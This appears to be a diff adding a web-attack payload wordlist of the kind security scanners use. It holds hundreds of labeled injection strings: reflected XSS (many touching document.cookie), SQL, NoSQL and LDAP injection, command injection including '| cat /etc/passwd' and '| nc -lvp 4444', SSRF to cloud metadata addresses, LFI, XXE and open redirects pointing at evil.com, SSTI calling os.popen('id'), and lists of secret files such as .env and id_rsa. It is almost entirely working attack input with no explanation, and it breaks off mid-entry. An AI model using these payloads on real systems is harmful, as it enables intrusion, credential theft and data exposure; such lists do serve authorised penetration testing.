+[HttpParams Dataset] 反射型XSS
+PAYLOAD: ;!--"<xss>=&{()}"
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <img id=xss src="jav ascript:alert('xss');">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: ";alert('xss');//
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: '';!--"<xss>=&{()}
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: alert(1)>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: ";alert('xss)//
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: data:text/html, type=image>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <isindex action=j a vas c r ipt:alert(1) type=image>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: confirm(2)>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: "http://www.google.com./">xss</a>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: write(1) autofocus>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: write(1) autofocus><input autofocus>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: "alert(1)">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: "alert(1)"><source></source></video>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: alert(1)><input autofocus>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: "import" href="test.svg" />
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: "div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: document.getelementbyid("div1").innerhtml;</script>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: width:1px;filter:glow onfilterchange=alert(1)>x</div>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: mhtml:http://html5sec.org/test.html!xss.html></iframe>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: alt=alert(1)//">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: alert(1)></title><title title=></title>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: x:expression8write(1)9>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: $,_=1}}).$=alert</script>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: function,[{}][0].constructor._('alert(1)')()</script>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <img src="jav ascript:document.cookie=true;">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <br size="&{document.cookie=true}">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: scriptdocument.cookie=true;/script
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <a href="javascript#document.cookie=true;">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: &{document.cookie=true;};
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <img src=&{document.cookie=true;};>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <img src="mocha:document.cookie=true;">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <img src="livescript:document.cookie=true;">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <div style="behaviour: url([link to code]);">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <div style="binding: url([link to code]);">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: >"<img src="jav ascript:document.cookie=true;">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: >"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: >"<br size="&{document.cookie=true}">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: >"scriptdocument.cookie=true;/script
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: >"<a href="javascript#document.cookie=true;">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: >"&{document.cookie=true;};
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: >"<div style="behaviour: url([link to code]);">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: >"<div style="binding: url([link to code]);">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: -1<img src="jav ascript:document.cookie=true;">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: -1<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: -1<br size="&{document.cookie=true}">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: -1scriptdocument.cookie=true;/script
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: -1<a href="javascript#document.cookie=true;">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: -1&{document.cookie=true;};
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: -1<img src=&{document.cookie=true;};>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: -1<img src="mocha:document.cookie=true;">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: -1<img src="livescript:document.cookie=true;">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: -1<div style="behaviour: url([link to code]);">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: -1<div style="binding: url([link to code]);">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: >"<iframe src=http://vulnerability-lab.com/>@gmail.com
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <iframe src=http://vulnerability-lab.com/>@gmail.com
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: +49/>"<iframe src=http://vulnerability-lab.com>1337
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <iframe src=http://vulnerability-lab.com>1337+1
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: >"<iframe src=http://vulnerability-lab.com></iframe>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <html><body>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <button.onclick="alert(string.fromcharcode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,110,103,64,82,69,77,7,86,69,34,41,60,47,115,99,114,105,112,116,62));">string:from.char.code</button></body></html>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: '';!--"<crosssitescripting>=&{()}
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <iframe src=http://www.vulnerability-lab.com>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <img src="jav ascript:alert('crosssitescripting');">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <img src="mocha:[code]">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <img src="livescript:[code]">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <div style="background-image:52c8'a161332904a1c5248.10278.1053379'9">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <layer src="http://vulnerability-lab.com/script.html"></layer>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <div id=xss style="width: expression(alert('xss'));">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <xml id=xss src="xsstest.xml" id=i></xml><span dataid=xss src=#i datafld=c dataformatas=html></span>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <a href="javascript#alert('xss');">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <img id=xss src=&{alert('xss');};>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <div datafld="b" dataformatas="html" dataid=xss src="#xss"></div>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: [a][a]script>alert('xss');[a][a]/script>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: id=xss src= <img 6;avascript:alert('xss')>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <br size="&{alert('xss')}">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <layer id=xss src="http://ha.ckers.org/scriptlet.html"></layer>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <img id=xss src="mocha:[code]">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <img id=xss src="livescript:[code]">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: exp/*<xss style='no\\xss:noxss("*//*");
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: a="get";
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <xml id=xss src="http://ha.ckers.org/xsstest.xml" id=i></xml>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <? echo('<scr)';
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: ' OR '1'='1
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: admin' --
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: ' OR 1=1--
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: ' OR 'a'='a
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: ' OR 1=1#
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: ' OR 1=1/*
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: ' OR SLEEP(5)--
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: ' OR 1=1 LIMIT 1;--
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: WAITFOR DELAY '0:0:5'
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: )) OR EXISTS(SELECT * FROM users WHERE username='admin')--
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: %2553%2527%2520OR%25201%253D1
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: /**/OR/**/1=1
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: %2527%2520OR%25201%253D1--
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: '/**/OR/**/1=1--
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: '%09OR%091=1--
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: '\u0020OR\u00201=1--
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: 0x27204f52203120314431--
+--------------------------------------------------------------------------------
+[SQL Injection] Diverse JSON (Basic) - SQL Injection
+PAYLOAD: 'UNION/*!50000SELECT*/1,2,3--
+--------------------------------------------------------------------------------
+[Path Traversal] Diverse JSON (Basic) - Path Traversal
+PAYLOAD: ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+--------------------------------------------------------------------------------
+[Command Injection] Diverse JSON (Basic) - Command Injection
+PAYLOAD: | cat /etc/passwd
+--------------------------------------------------------------------------------
+[Command Injection] Diverse JSON (Basic) - Command Injection
+PAYLOAD: | id
+--------------------------------------------------------------------------------
+[Command Injection] Diverse JSON (Basic) - Command Injection
+PAYLOAD: ; ping -c 10 127.0.0.1
+--------------------------------------------------------------------------------
+[Command Injection] Diverse JSON (Basic) - Command Injection
+PAYLOAD: | nc -lvp 4444
+--------------------------------------------------------------------------------
+[SSRF] Diverse JSON (Basic) - SSRF
+PAYLOAD: http://127.0.0.1/
+--------------------------------------------------------------------------------
+[SSRF] Diverse JSON (Basic) - SSRF
+PAYLOAD: file:///etc/passwd
+--------------------------------------------------------------------------------
+[SSRF] Diverse JSON (Basic) - SSRF
+PAYLOAD: http://127.0.0.1/latest/meta-data/
+--------------------------------------------------------------------------------
+[SSRF] Diverse JSON (Basic) - SSRF
+PAYLOAD: http://localhost:80/
+--------------------------------------------------------------------------------
+[SSRF] Diverse JSON (Basic) - SSRF
+PAYLOAD: http://0.0.0.0:80/
+--------------------------------------------------------------------------------
+[SSRF] Diverse JSON (Basic) - SSRF
+PAYLOAD: http://[::1]/
+--------------------------------------------------------------------------------
+[SSRF] Diverse JSON (Basic) - SSRF
+PAYLOAD: http://example.com@127.0.0.1/
+--------------------------------------------------------------------------------
+[SSRF] Diverse JSON (Basic) - SSRF
+PAYLOAD: http://169.254.169.254/latest/meta-data/
+--------------------------------------------------------------------------------
+[SSRF] Diverse JSON (Basic) - SSRF
+PAYLOAD: http://[::ffff:127.0.0.1]
+--------------------------------------------------------------------------------
+[SSRF] Diverse JSON (Basic) - SSRF
+PAYLOAD: http://127.1
+--------------------------------------------------------------------------------
+[SSRF] Diverse JSON (Basic) - SSRF
+PAYLOAD: http://0177.0.0.1
+--------------------------------------------------------------------------------
+[SSRF] Diverse JSON (Basic) - SSRF
+PAYLOAD: http://2130706433
+--------------------------------------------------------------------------------
+[SSRF] Diverse JSON (Basic) - SSRF
+PAYLOAD: d0vjq03vq99i18n2rq6gaw9riihcum3it.oast.live
+--------------------------------------------------------------------------------
+[NoSQL Injection] Diverse JSON (Basic) - NoSQL Injection
+PAYLOAD: {'$gt':''}
+--------------------------------------------------------------------------------
+[NoSQL Injection] Diverse JSON (Basic) - NoSQL Injection
+PAYLOAD: {"$ne":null}
+--------------------------------------------------------------------------------
+[NoSQL Injection] Diverse JSON (Basic) - NoSQL Injection
+PAYLOAD: {"username": {"$ne": null}, "password": {"$ne": null}}
+--------------------------------------------------------------------------------
+[NoSQL Injection] Diverse JSON (Basic) - NoSQL Injection
+PAYLOAD: {"$where": "this.password == this.passwordConfirm"}
+--------------------------------------------------------------------------------
+[NoSQL Injection] Diverse JSON (Basic) - NoSQL Injection
+PAYLOAD: {"$or": [{}, {}]}
+--------------------------------------------------------------------------------
+[Local File Inclusion] Diverse JSON (Basic) - Local File Inclusion
+PAYLOAD: php://filter/convert.base64-encode/resource=index.php
+--------------------------------------------------------------------------------
+[Local File Inclusion] Diverse JSON (Basic) - Local File Inclusion
+PAYLOAD: /etc/passwd
+--------------------------------------------------------------------------------
+[Local File Inclusion] Diverse JSON (Basic) - Local File Inclusion
+PAYLOAD: /proc/self/environ
+--------------------------------------------------------------------------------
+[Local File Inclusion] Diverse JSON (Basic) - Local File Inclusion
+PAYLOAD: index.php%00.jpg
+--------------------------------------------------------------------------------
+[LDAP Injection] Diverse JSON (Basic) - LDAP Injection
+PAYLOAD: *)(|(uid=*))
+--------------------------------------------------------------------------------
+[LDAP Injection] Diverse JSON (Basic) - LDAP Injection
+PAYLOAD: *))(objectClass=*))(|(objectClass=*)
+--------------------------------------------------------------------------------
+[LDAP Injection] Diverse JSON (Basic) - LDAP Injection
+PAYLOAD: admin)(|(password=*))
+--------------------------------------------------------------------------------
+[HTTP Request Smuggling] Diverse JSON (Basic) - HTTP Request Smuggling
+PAYLOAD: Transfer-Encoding: chunked
+0
+
+GARBAGE
+--------------------------------------------------------------------------------
+[Open Redirect] Diverse JSON (Basic) - Open Redirect
+PAYLOAD: //evil.com
+--------------------------------------------------------------------------------
+[Open Redirect] Diverse JSON (Basic) - Open Redirect
+PAYLOAD: http://evil.com
+--------------------------------------------------------------------------------
+[Open Redirect] Diverse JSON (Basic) - Open Redirect
+PAYLOAD: /\evil.com
+--------------------------------------------------------------------------------
+[Open Redirect] Diverse JSON (Basic) - Open Redirect
+PAYLOAD: //google.com%2F%2Fevil.com
+--------------------------------------------------------------------------------
+[Open Redirect] Diverse JSON (Basic) - Open Redirect
+PAYLOAD: /login?Redirect=http://evil.com
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: .git
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: .git/config
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: .gitignore
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: requirements.txt
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: composer.json
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: composer.lock
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: package.json
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: package-lock.json
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: yarn.lock
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: config.php
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: wp-config.php
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: .env
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: docker-compose.yml
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: id_rsa
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: id_rsa.pub
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: web.config
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: appsettings.json
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: database.yml
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: .htpasswd
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: .htaccess
+--------------------------------------------------------------------------------
+[Sensitive Files] Diverse JSON (Basic) - Sensitive Files
+PAYLOAD: database.bak
+--------------------------------------------------------------------------------
+[CRLF Injection] Diverse JSON (Basic) - CRLF Injection
+PAYLOAD: %0d%0aSet-Cookie: malicious=true
+--------------------------------------------------------------------------------
+[CRLF Injection] Diverse JSON (Basic) - CRLF Injection
+PAYLOAD: 
+Location: http://malicious.com
+--------------------------------------------------------------------------------
+[CRLF Injection] Diverse JSON (Basic) - CRLF Injection
+PAYLOAD: %0d%0aContent-Length:0
+--------------------------------------------------------------------------------
+[CRLF Injection] Diverse JSON (Basic) - CRLF Injection
+PAYLOAD: %250d%250aContent-Length:0
+--------------------------------------------------------------------------------
+[UTF8/Unicode Bypass] Diverse JSON (Basic) - UTF8/Unicode Bypass
+PAYLOAD: \u0027 OR \u00271\u0027=\u00271
+--------------------------------------------------------------------------------
+[UTF8/Unicode Bypass] Diverse JSON (Basic) - UTF8/Unicode Bypass
+PAYLOAD: %E2%80%98 OR %E2%80%981%E2%80%99=%E2%80%991
+--------------------------------------------------------------------------------
+[UTF8/Unicode Bypass] Diverse JSON (Basic) - UTF8/Unicode Bypass
+PAYLOAD: Ω OR Ω=Ω
+--------------------------------------------------------------------------------
+[XXE] Diverse JSON (Basic) - XXE
+PAYLOAD: <?xml version="1.0"?><foo>&xxe;</foo>
+--------------------------------------------------------------------------------
+[XXE] Diverse JSON (Basic) - XXE
+PAYLOAD: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil'>]><foo>&xxe;</foo>
+--------------------------------------------------------------------------------
+[XXE] Diverse JSON (Basic) - XXE
+PAYLOAD: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]>
+--------------------------------------------------------------------------------
+[XXE] Diverse JSON (Basic) - XXE
+PAYLOAD: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///dev/random'>]><foo>&xxe;</foo>
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: {{7*7}}
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: ${7*7}
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: <%= 7*7 %>
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: {{=7*7}}
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: #{7*7}
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: {{7*'7'}}
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: {{config}}
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: {{self}}
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: {{[].__class__.__mro__[1].__subclasses__()}}
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: {{().__class__.__bases__[0].__subclasses__()}}
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: <%={{7*7}}%>
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: ${{7*7}}
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: {{request}}
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: {{url_for}}
+--------------------------------------------------------------------------------
+[SSTI] Diverse JSON (Basic) - SSTI
+PAYLOAD: {{cycler.__init__.__globals__.os.popen('id').read()}}
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: param=1&param=2
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: user=admin&user=guest
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: id=1;id=2
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: id=1&&id=2
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: id=1,id=2
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: id=1 id=2
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: id=1&id=
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: param=&param=2
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: param=1&Param=2
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: param[0]=1&param[1]=2
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: param[]=1&param[]=2
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: param=1&%70%61%72%61%6d=2
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: param=1&par%61m=2
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: param.1=1&param.2=2
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: param=1|param=2
+--------------------------------------------------------------------------------
+[HTTP Parameter Pollution] Diverse JSON (Basic) - HTTP Parameter Pollution
+PAYLOAD: param[a]=1&param[b]=2
+--------------------------------------------------------------------------------
+[Web Cache Poisoning] Diverse JSON (Basic) - Web Cache Poisoning
+PAYLOAD: X-Forwarded-Host: evil.com
+--------------------------------------------------------------------------------
+[Web Cache Poisoning] Diverse JSON (Basic) - Web Cache Poisoning
+PAYLOAD: X-Original-URL: /admin
+--------------------------------------------------------------------------------
+[Web Cache Poisoning] Diverse JSON (Basic) - Web Cache Poisoning
+PAYLOAD: X-Forwarded-Proto: https
+--------------------------------------------------------------------------------
+[Web Cache Poisoning] Diverse JSON (Basic) - Web Cache Poisoning
+PAYLOAD: X-Host: evil.com
+--------------------------------------------------------------------------------
+[Web Cache Poisoning] Diverse JSON (Basic) - Web Cache Poisoning
+PAYLOAD: X-Forwarded-Scheme: javascript://
+--------------------------------------------------------------------------------
+[Web Cache Poisoning] Diverse JSON (Basic) - Web Cache Poisoning
+PAYLOAD: X-HTTP-Method-Override: PURGE
+--------------------------------------------------------------------------------
+[Web Cache Poisoning] Diverse JSON (Basic) - Web Cache Poisoning
+PAYLOAD: X-Forwarded-Server: evil.com
+--------------------------------------------------------------------------------
+[Web Cache Poisoning] Diverse JSON (Basic) - Web Cache Poisoning
+PAYLOAD: X-Forwarded-Port: 443
+--------------------------------------------------------------------------------
+[Web Cache Poisoning] Diverse JSON (Basic) - Web Cache Poisoning
+PAYLOAD: X-Original-Host: evil.com
+--------------------------------------------------------------------------------
+[IP Bypass] Diverse JSON (Basic) - IP Bypass
+PAYLOAD: X-Forwarded-For: 127.0.0.1
+--------------------------------------------------------------------------------
+[IP Bypass] Diverse JSON (Basic) - IP Bypass
+PAYLOAD: X-Remote-IP: 127.0.0.1
+--------------------------------------------------------------------------------
+[IP Bypass] Diverse JSON (Basic) - IP Bypass
+PAYLOAD: X-Remote-Addr: 127.0.0.1
+--------------------------------------------------------------------------------
+[IP Bypass] Diverse JSON (Basic) - IP Bypass
+PAYLOAD: X-Client-IP: 127.0.0.1
+--------------------------------------------------------------------------------
+[IP Bypass] Diverse JSON (Basic) - IP Bypass
+PAYLOAD: X-Real-IP: 127.0.0.1
+--------------------------------------------------------------------------------
+[IP Bypass] Diverse JSON (Basic) - IP Bypass
+PAYLOAD: X-Forwarded-For: 127.0.0.1, evil.com
+--------------------------------------------------------------------------------
+[IP Bypass] Diverse JSON (Basic) - IP Bypass
